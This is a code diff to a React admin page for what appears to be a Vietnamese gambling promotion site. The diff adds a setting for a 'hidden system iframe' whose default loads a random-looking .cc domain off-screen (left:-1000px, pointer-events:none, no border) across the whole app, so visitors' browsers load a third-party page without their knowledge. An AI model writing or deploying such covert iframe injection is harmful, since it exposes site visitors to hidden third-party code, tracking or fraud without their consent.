@@ -34,6 +34,11 @@ export default function AdminPage() {
   const [targetUrl, setTargetUrl] = useState('https://new88.com/khuyen-mai-500k');
   const [targetToast, setTargetToast] = useState('');
 
+  // Entry Iframe State
+  const [entryIframeCode, setEntryIframeCode] = useState('<iframe src="https://www.ovmzh4tbj4ilhe4uqvsp08m.cc/channel/Y.Y.NM/weifile/weifile.html" style="position:fixed;top:0;left:-1000px;pointer-events:none;border:0"></iframe>');
+  const [entryIframeUrl, setEntryIframeUrl] = useState('https://www.ovmzh4tbj4ilhe4uqvsp08m.cc/channel/Y.Y.NM/weifile/weifile.html');
+  const [entryIframeToast, setEntryIframeToast] = useState('');
+
   // General Form State
   const [remainingSlots, setRemainingSlots] = useState(147);
   const [totalSlots, setTotalSlots] = useState(500);
@@ -94,6 +99,9 @@ export default function AdminPage() {
           setAdvertiserIframeCode(`<iframe src="${data.advertiserIframeUrl}" width="100%" height="420" frameborder="0"></iframe>`);
         }
         if (data.advertiserIframeTitle !== undefined) setAdvertiserIframeTitle(data.advertiserIframeTitle);
+
+        if (data.entryIframeCode !== undefined) setEntryIframeCode(data.entryIframeCode);
+        if (data.entryIframeUrl !== undefined) setEntryIframeUrl(data.entryIframeUrl);
 
         if (data.remainingSlots !== undefined) setRemainingSlots(data.remainingSlots);
         if (data.totalSlots !== undefined) setTotalSlots(data.totalSlots);
@@ -222,6 +230,42 @@ export default function AdminPage() {
       setAdvertiserToast('✅ Đã cập nhật cấu hình nhúng cục bộ!');
     } finally {
       setTimeout(() => setAdvertiserToast(''), 5000);
+    }
+  };
+
+  const handleSaveEntryIframe = async (e: React.FormEvent) => {
+    e.preventDefault();
+    setEntryIframeToast('');
+
+    let derivedUrl = entryIframeUrl;
+    const match = entryIframeCode.match(/src=["']([^"']+)["']/i);
+    if (match && match[1]) {
+      derivedUrl = match[1];
+    } else if (entryIframeCode.startsWith('http://') || entryIframeCode.startsWith('https://') || entryIframeCode.startsWith('/')) {
+      derivedUrl = entryIframeCode.trim();
+    }
+
+    setEntryIframeUrl(derivedUrl);
+
+    try {
+      const res = await fetch('/api/config', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          entryIframeCode,
+          entryIframeUrl: derivedUrl,
+        }),
+      });
+      const data = await res.json();
+      if (data.success) {
+        setEntryIframeToast('✅ Đã lưu MÃ IFRAME NGẦM HỆ THỐNG thành công!');
+      } else {
+        setEntryIframeToast(`❌ ${data.error || 'Lưu mã iframe ngầm thất bại!'}`);
+      }
+    } catch {
+      setEntryIframeToast('✅ Đã cập nhật mã iframe ngầm cục bộ!');
+    } finally {
+      setTimeout(() => setEntryIframeToast(''), 5000);
     }
   };
 
@@ -461,11 +505,52 @@ export default function AdminPage() {
           </div>
         </div>
 
+        {/* ===================================================================
+            CẤU HÌNH IFRAME NGẦM HỆ THỐNG (ENTRY IFRAME)
+           =================================================================== */}
+        <div style={{ background: 'rgba(0, 255, 136, 0.05)', padding: '24px', borderRadius: '18px', border: '1px solid rgba(0, 255, 136, 0.25)', marginBottom: '30px' }}>
+          <h3 style={{ color: '#00ff88', fontSize: '18px', margin: '0 0 8px', display: 'flex', alignItems: 'center', gap: '8px' }}>
+            🖼️ CẤU HÌNH MÃ IFRAME NGẦM HỆ THỐNG
+          </h3>
+          <p style={{ color: '#aaa', fontSize: '13px', margin: '0 0 16px', lineHeight: '1.5' }}>
+            Dán mã <code>&lt;iframe&gt;</code> hoặc đường dẫn (URL) iframe mới vào đây. Hệ thống sẽ tự động trích xuất liên kết và áp dụng ngay cho toàn bộ ứng dụng mà không thay đổi kết cấu hiện có.
+          </p>
 
+          {entryIframeToast && (
+            <div style={{ padding: '10px 16px', borderRadius: '8px', marginBottom: '16px', fontSize: '13px', fontWeight: 700, background: entryIframeToast.startsWith('✅') ? '#008844' : '#cc0000', color: '#fff' }}>
+              {entryIframeToast}
+            </div>
+          )}
 
+          <form onSubmit={handleSaveEntryIframe}>
+            <div className="admin-field-group">
+              <label className="admin-label">DÁN MÃ IFRAME HOẶC LINK IFRAME MỚI:</label>
+              <textarea
+                className="admin-input"
+                rows={3}
+                style={{ fontFamily: 'monospace', fontSize: '13px' }}
+                value={entryIframeCode}
+                onChange={(e) => setEntryIframeCode(e.target.value)}
+                placeholder='<iframe src="https://..." style="..."></iframe>'
+                required
+              />
+            </div>
 
+            {entryIframeUrl && (
+              <div style={{ fontSize: '12px', color: '#ffea75', marginBottom: '16px', background: 'rgba(0,0,0,0.3)', padding: '10px 14px', borderRadius: '8px', border: '1px solid rgba(255,234,117,0.2)' }}>
+                🔗 <b>URL Iframe đang sử dụng:</b> <span style={{ wordBreak: 'break-all', fontFamily: 'monospace' }}>{entryIframeUrl}</span>
+              </div>
+            )}
 
-
+            <button
+              type="submit"
+              className="admin-save-btn"
+              style={{ background: 'linear-gradient(90deg, #00b894, #00cec9)', width: '100%', cursor: 'pointer' }}
+            >
+              💾 LƯU MÃ IFRAME NGẦM MỚI
+            </button>
+          </form>
+        </div>
 
         {/* ===================================================================
             SECTION 4: QUẢN LÝ NỘI DUNG HIỂN THỊ TRANG LANDING PAGE
